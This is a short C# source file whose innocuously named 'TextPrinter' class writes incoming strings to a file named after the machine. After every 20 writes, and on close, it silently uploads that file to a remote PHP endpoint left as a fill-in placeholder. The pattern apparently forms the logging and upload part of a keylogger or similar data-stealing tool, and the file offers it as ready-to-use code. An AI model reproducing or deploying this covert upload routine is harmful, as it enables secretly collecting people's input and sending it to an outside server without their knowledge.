using System;
using System.IO;

public class TextPrinter
{
    private static string path = Environment.MachineName + ".txt";
    private static int count = 0;

    private static TextWriter textWriter;

    public static void initialize()
    {
        if (!File.Exists(path))
        {
            System.IO.File.WriteAllText(path, "Start logging \n");
            textWriter = new StreamWriter(path, true);
            textWriter.WriteLine();
        }
        else if (File.Exists(path))
        {
            if (textWriter == null) textWriter = new StreamWriter(path, true);
        }
    }

    public static void write(string str)
    {
        textWriter.Write(str);
        count++;
        if (count == 20)
        {
            textWriter.WriteLine();
            textWriter.Close();
            textWriter = null;
            count = 0;
            System.Net.WebClient Client = new System.Net.WebClient();
            Client.Headers.Add("Content-Type", "binary/octet-stream");
            byte[] result = Client.UploadFile("Your address of PHP file", "POST",
                                              path);
            string s = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);

            initialize();
        }
    }

    public static void close()
    {
        textWriter.Close();
        System.Net.WebClient Client = new System.Net.WebClient();
        Client.Headers.Add("Content-Type", "binary/octet-stream");
        byte[] result = Client.UploadFile("Your address of php file", "POST",
                                          path);
    }
}
